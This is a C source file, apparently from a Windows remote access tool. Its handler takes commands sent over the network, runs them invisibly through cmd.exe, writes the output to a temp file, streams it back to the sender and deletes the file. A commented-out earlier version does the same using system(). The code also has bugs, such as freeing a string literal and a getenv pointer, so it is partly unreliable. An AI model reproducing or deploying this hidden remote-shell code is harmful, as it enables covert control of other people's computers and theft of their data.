#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <dirent.h>
#include "types.h"
#include "net/interface.h"
#include "net/commands.h"

int net_cmd_System(char* msg, int msgLen)
{
	char* temp_path = getenv("TEMP");
	int len = strlen(temp_path) + 16;
	char* buff_path = "testlog";//malloc(len);
	//snprintf(buff_path, len, "%s\\mKtIXMj52rh7PU", temp_path);

	PROCESS_INFORMATION pi; 
	STARTUPINFO si;
	SECURITY_ATTRIBUTES sa;
	sa.nLength = sizeof(sa);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = 1;       

    	HANDLE h_temp = CreateFile(buff_path, FILE_APPEND_DATA, FILE_SHARE_WRITE | FILE_SHARE_READ, &sa, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	memset(&pi, 0, sizeof(PROCESS_INFORMATION));
	memset(&si, 0, sizeof(STARTUPINFO));
	si.cb = sizeof(STARTUPINFO); 
	si.dwFlags |= STARTF_USESTDHANDLES;
	si.hStdInput = NULL;
	si.hStdError = h_temp;
	si.hStdOutput = h_temp;

	char buff[100];
	memset(buff, 0, 100);

	char* _nmsg = malloc(strlen(msg) + strlen("cmd.exe /c ") + sizeof(char));
	sprintf(_nmsg, "cmd.exe /c %s", msg);

	if(CreateProcess(NULL, _nmsg, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
	{
		WaitForInputIdle(pi.hProcess, 500);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		CloseHandle(h_temp);
		free(_nmsg);
	
		FILE *f = fopen(buff_path, "r");
		fseek(f, 0, SEEK_SET);
		Sleep(50);

		while(fgets(buff, 100, f) != NULL)
		{
			Sleep(10);

			if(net_SendData(buff, strlen(buff)) < 1)
			{
				fclose(f);
				remove(buff_path);
				free(buff_path);
				free(temp_path);
	
				return -1;
			}
	
			
			memset(buff, 0, 100);
		}

		TerminateProcess(pi.hProcess, 0);
		fclose(f);
	}else{
		CloseHandle(h_temp);
		free(_nmsg);
	}

	remove(buff_path);
	free(buff_path);
	free(temp_path);

	buff[0] = NET_CMD_SYSTEM;
	
	if(net_SendData(buff, 2) < 1)
	{
		return -1;
	}

	return 1;
}

/*
int net_cmd_System(char* msg, int msgLen)
{
	char* temp_path = getenv("TEMP");
	int len = strlen(temp_path) + 16;
	char* buff_path = malloc(len);
	snprintf(buff_path, len, "%s\\mKtIXMj52rh7PU", temp_path);
	
	FILE *f = fopen(buff_path, "a+");
	int savedStdout = dup(1);
	dup2(_fileno(f), 1);

	system(msg);

	fflush(stdout);
	dup2(savedStdout, 1);
	fseek(f, 0, SEEK_SET);

	char buff[100];
	memset(buff, 0, 100);

	while(fgets(buff, 100, f) != NULL)
	{
		if(net_SendData(buff, strlen(buff)) < 1)
		{
			fclose(f);
			remove(buff_path);
			free(buff_path);
			free(temp_path);

			return -1;
		}

		Sleep(5);
		
		memset(buff, 0, 100);
	}

	fclose(f);
	remove(buff_path);
	free(buff_path);
	free(temp_path);

	buff[0] = NET_CMD_SYSTEM;
	
	if(net_SendData(buff, 2) < 1)
	{
		return -1;
	}

	return 1;
}*/